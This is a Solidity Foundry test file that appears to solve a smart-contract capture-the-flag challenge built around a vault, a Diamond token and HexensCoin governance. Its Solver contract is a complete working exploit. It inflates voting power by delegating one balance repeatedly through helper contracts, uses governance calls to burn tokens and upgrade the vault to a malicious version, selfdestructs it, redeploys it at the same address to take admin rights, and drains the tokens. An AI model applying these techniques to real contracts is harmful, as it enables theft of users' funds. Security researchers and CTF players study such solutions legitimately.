// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import "../src/Challenge.sol";

contract CounterTest is Test {
    Challenge public challenge;

    address public player = address(0x1111);

    VaultFactory public vaultFactory;
    Vault public vault;
    Diamond public diamond;
    HexensCoin public hexensCoin;

    function setUp() public {
        challenge = new Challenge(address(player));
        vaultFactory = challenge.vaultFactory();
        vault = challenge.vault();
        diamond = challenge.diamond();
        hexensCoin = challenge.hexensCoin();
    }

    function test_Increment() public {
        vm.startPrank(player);

        Solver solver = new Solver(address(challenge));
        hexensCoin.approve(address(solver), type(uint256).max);
        solver.solve();
        skip(1000);
        vm.roll(block.number + 11);

        solver.solveStep2();

        console.log("solved: ", challenge.isSolved());
        vm.stopPrank();
    }
}

contract Solver {
    Challenge public challenge;
    VaultFactory public vaultFactory;
    Vault public vault;
    Diamond public diamond;
    HexensCoin public hexensCoin;
    NewVault public newVault;
    //Must be multicall upgrade so.

    uint256 diamonds = 31337;

    constructor(address _addr) {
        challenge = Challenge(_addr);
        vaultFactory = challenge.vaultFactory();
        vault = challenge.vault();
        diamond = challenge.diamond();
        hexensCoin = challenge.hexensCoin();
        newVault = new NewVault();
    }

    function solve() public {
        challenge.claim();
        for (uint256 i = 0; i < 12; i++) {
            Delegeme delegeme = new Delegeme(hexensCoin);
            hexensCoin.approve(address(delegeme), type(uint256).max);
            delegeme.delegateMe();
        }
        //got 100_000 votes power

        burnDiamonds();
        upgradeAndDie(); //selfdestruct at the end of block
    }

    function solveStep2() public {
        redeployVault();
    }

    function burnDiamonds() internal {
        bytes memory callData =
            abi.encodeWithSignature("burn(address,uint256)", address(diamond), diamond.balanceOf(address(vault)));
        vault.governanceCall(callData);
    }

    function upgradeAndDie() internal {
        bytes memory callData = abi.encodeWithSignature("upgradeTo(address)", address(newVault));
        vault.governanceCall(callData);
        NewVault vaultV2 = NewVault(address(vault));
        vaultV2.die();
        console.log("size:", address(vaultV2).code.length);
    }

    function redeployVault() internal {
        vault =
            vaultFactory.createVault(keccak256("The tea in Nepal is very hot. But the coffee in Peru is much hotter."));
        vault.initialize(address(diamond), address(hexensCoin));
        //now we get admin. just upgrade
        vault.upgradeTo(address(newVault));
        NewVault vaultV2 = NewVault(address(vault));
        vaultV2.newBurner();
        vaultV2.move(address(newVault));
    }
}

contract Delegeme {
    HexensCoin public coin;

    constructor(HexensCoin _addr) {
        coin = _addr;
    }

    function delegateMe() public {
        coin.transferFrom(msg.sender, address(this), 10_000e18);
        coin.delegate(msg.sender);
        coin.transfer(msg.sender, 10_000e18);
    }
}

contract NewVault is Vault {
    function newBurner() public {
        NewBurner burner = new NewBurner();
        console.log("newBurner", address(burner));
        burner.withdraw(address(diamond), msg.sender, diamond.balanceOf(address(burner)));
    }

    function move(address target) public {
        console.log("moving to ", target);
        diamond.transfer(target, diamond.balanceOf(target));
    }

    function die() public {
        selfdestruct(payable(msg.sender));
    }
}

contract NewBurner is Burner {
    function withdraw(address token, address to, uint256 amount) public {
        console.log("withdraw %e", amount);
        IERC20(token).transfer(to, amount);
    }
}
